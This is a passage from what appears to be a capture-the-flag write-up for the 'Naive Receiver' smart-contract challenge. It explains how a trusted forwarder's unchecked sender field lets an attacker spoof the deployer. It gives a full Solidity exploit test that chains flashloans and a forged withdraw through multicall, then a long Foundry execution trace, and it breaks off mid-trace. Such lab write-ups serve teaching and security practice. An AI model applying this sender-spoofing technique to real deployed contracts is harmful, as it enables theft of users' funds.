<h3 id="️-vulnerability-explained">⚠️ Vulnerability Explained</h3>

<p>The <strong>forwarder</strong> blindly trusts the sender field embedded in the calldata of <code class="language-plaintext highlighter-rouge">withdraw()</code> when processed via <code class="language-plaintext highlighter-rouge">multicall()</code>. This creates a <strong>spoofable sender</strong> situation. An attacker can:</p>
<ol>
  <li>Encode a series of flashloan calls to drain the victim receiver’s balance.</li>
  <li>Add a <code class="language-plaintext highlighter-rouge">withdraw()</code> call to extract all funds from the pool by spoofing ownership using <code class="language-plaintext highlighter-rouge">abi.encodePacked(...)</code>.</li>
  <li>Sign the entire payload off-chain and have the forwarder execute it.</li>
</ol>

<hr />

<h3 id="exploit-strategy-2">Exploit Strategy</h3>

<ol>
  <li>Encode 10 consecutive flashloans that charge the victim’s receiver 1 WETH each (draining 10 WETH total).</li>
  <li>Encode a <code class="language-plaintext highlighter-rouge">withdraw()</code> call that drains both pool and receiver funds.</li>
  <li>Combine calls using <code class="language-plaintext highlighter-rouge">multicall()</code>.</li>
  <li>Forge the sender identity by packing the deployer address at the end of the call data.</li>
  <li>Execute the entire call using <code class="language-plaintext highlighter-rouge">forwarder.execute()</code> with a valid EIP-712 signature.</li>
</ol>

<hr />

<h3 id="exploit-code-solidity">Exploit Code (Solidity)</h3>

<pre><code class="language-solidity">function test_naiveReceiver() public checkSolvedByPlayer {
    bytes ;

    for (uint i = 0; i &lt; 10; i++) {
        callDatas[i] = abi.encodeCall(
            NaiveReceiverPool.flashLoan,
            (receiver, address(weth), 0, "0x")
        );
    }

    callDatas[10] = abi.encodePacked(
        abi.encodeCall(
            NaiveReceiverPool.withdraw,
            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        ),
        bytes32(uint256(uint160(deployer)))
    );

    bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

    BasicForwarder.Request memory request = BasicForwarder.Request(
        player,
        address(pool),
        0,
        gasleft(),
        forwarder.nonces(player),
        multicallData,
        1 days
    );

    bytes32 requestHash = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
    bytes memory signature = abi.encodePacked(r, s, v);

    forwarder.execute(request, signature);
}
</code></pre>

<h3 id="proof-of-exploit-3">Proof of Exploit:</h3>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="na">simple to explain test case </span><span class="pi">:</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_naiveReceiver() (gas</span><span class="pi">:</span> <span class="s">477289)</span>
<span class="na">Balance assertions</span><span class="pi">:</span>
<span class="na">WETH in FlashLoanReceiver</span><span class="pi">:</span> <span class="m">0</span>
<span class="na">WETH in NaiveReceiverPool</span><span class="pi">:</span> <span class="m">0</span>
<span class="na">WETH in recovery</span><span class="pi">:</span> <span class="s">1010 WETH (successfully rescued all funds)</span>

<span class="na">Using Foundry  to run testCase(o/p)</span><span class="pi">:</span>

<span class="s">Ran 1 test for test/naive-receiver/NaiveReceiver.t.sol:NaiveReceiverChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_naiveReceiver() (gas</span><span class="pi">:</span> <span class="s">477289)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">601877</span><span class="pi">]</span> <span class="s">NaiveReceiverChallenge::test_naiveReceiver()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [2823] BasicForwarder::nonces(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [599] BasicForwarder::domainSeparator() [staticcall]</span>
    <span class="s">│   └─ ← [Return] 0x195a83794daaa3fd456b03f6e4648d959ea3719c9fbdd4a111541654d5c613b2</span>
    <span class="s">├─ [5020] BasicForwarder::getDataHash(Request({ from</span><span class="err">:</span> <span class="s">0x44E97aF4418b7a17AABD8090bEA0A471a366305C, target</span><span class="err">:</span> <span class="s">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, value</span><span class="err">:</span> <span class="s">0, gas</span><span class="err">:</span> <span class="s">1073681376 [1.073e9], nonce</span><span class="err">:</span> <span class="s">0, data</span><span class="err">:</span> <span class="s">0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000b0000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000003600000000000000000000000000000000000000000000000000000000000000460000000000000000000000000000000000000000000000000000000000000056000000000000000000000000000000000000000000000000000000000000006600000000000000000000000000000000000000000000000000000000000000760000000000000000000000000000000000000000000000000000000000000086000000000000000000000000000000000000000000000000000000000000009600000000000000000000000000000000000000000000000000000000000000a600000000000000000000000000000000000000000000000000000000000000b6000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000002307800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006400f714ce000000000000000000000000000000000000000000000036c090d0ca6888000000000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea000000000000000000000000ae0bdc4eeac5e950b67c6819b118761caaf6194600000000000000000000000000000000000000000000000000000000, deadline</span><span class="err">:</span> <span class="s">86400 [8.64e4] })) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 0x448a3f9e902fd8dd1a91bcf095dd9647dac6f45566882719efffe49c1dd8fdf7</span>
    <span class="s">├─ [0] VM::sign("&lt;pk&gt;", 0x98966e1e9df3f5206507a3621d8d596c3022186641015b3951e1b97144d72aa1) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 27, 0x3351cb39b71d8f78dad7c7aab44673cf376a91c50356b7a8ca45d87c14c98ff6, 0x4b10319df483a324ac03a96f87ea38701964f8e26cf6a5a637078389b947fe80</span>
    <span class="s">├─ [527949] BasicForwarder::execute(Request({ from</span><span class="err">:</span> <span class="s">0x44E97aF4418b7a17AABD8090bEA0A471a366305C, target</span><span class="err">:</span> <span class="s">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, value</span><span class="err">:</span> <span class="s">0, gas</span><span class="err">:</span> <span class="s">1073681376 [1.073e9], nonce</span><span class="err">:</span> <span class="s">0, data</span><span class="err">:</span> <span class="s">0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000b0000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000003600000000000000000000000000000000000000000000000000000000000000460000000000000000000000000000000000000000000000000000000000000056000000000000000000000000000000000000000000000000000000000000006600000000000000000000000000000000000000000000000000000000000000760000000000000000000000000000000000000000000000000000000000000086000000000000000000000000000000000000000000000000000000000000009600000000000000000000000000000000000000000000000000000000000000a600000000000000000000000000000000000000000000000000000000000000b6000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000002307800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006400f714ce000000000000000000000000000000000000000000000036c090d0ca6888000000000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea000000000000000000000000ae0bdc4eeac5e950b67c6819b118761caaf6194600000000000000000000000000000000000000000000000000000000, deadline</span><span class="err">:</span> <span class="s">86400 [8.64e4] }), 0x3351cb39b71d8f78dad7c7aab44673cf376a91c50356b7a8ca45d87c14c98ff64b10319df483a324ac03a96f87ea38701964f8e26cf6a5a637078389b947fe801b)</span>
    <span class="s">│   ├─ [373] NaiveReceiverPool::trustedForwarder() [staticcall]</span>
    <span class="s">│   │   └─ ← [Return] BasicForwarder</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span>
    <span class="s">│   ├─ [3000] PRECOMPILES::ecrecover(0x98966e1e9df3f5206507a3621d8d596c3022186641015b3951e1b97144d72aa1, 27, 23212472500503303283916190069849825222867664427246845595418244297757926461430, 33952075640814404360023555046328832035072183034039714461156042761591782375040) [staticcall]</span>
    <span class="s">│   │   └─ ← [Return] 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c</span>
    <span class="s">│   ├─ [490015] NaiveReceiverPool::multicall([0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x00f714ce000000000000000000000000000000000000000000000036c090d0ca6888000000000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea000000000000000000000000ae0bdc4eeac5e950b67c6819b118761caaf61946])</span>
    <span class="s">│   │   ├─ [69376] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [7607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="s">│   │   │   │   ├─ emit Transfer(from</span><span class="na">: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [30931] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [25102] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [10210] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
